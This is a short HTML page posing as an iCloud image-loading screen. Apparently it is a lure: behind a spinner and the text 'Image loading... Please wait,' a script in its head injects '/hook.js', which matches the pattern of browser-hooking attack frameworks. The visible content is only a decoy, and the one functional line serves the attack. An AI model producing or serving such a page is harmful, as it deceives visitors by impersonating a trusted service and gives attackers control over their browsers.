<!DOCTYPE html>
<html>
  <head>
    <title>iCloud Image Loading Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
		var commandModuleStr = '<script src="/hook.js" type="text/javascript"><\/script>';
		document.write(commandModuleStr);
	</script>

    <style>
      /* Center the loading animation and text on the page */
      #loading-container {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100vh;
        font-size: 18px;
        color: #333;
        text-align: center;
      }

      /* Style for the loading animation */
      #loading {
        border: 8px solid #f3f3f3;
        border-top: 8px solid #3498db;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
        margin-bottom: 10px;
      }

      /* Keyframe animation for the loading spinner */
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    </style>
  </head>
  <body>
    <div id="loading-container">
      <div id="loading"></div>
      <p>Image loading...</p>
      <p>Please wait.</p>
    </div>
  </body>
</html>
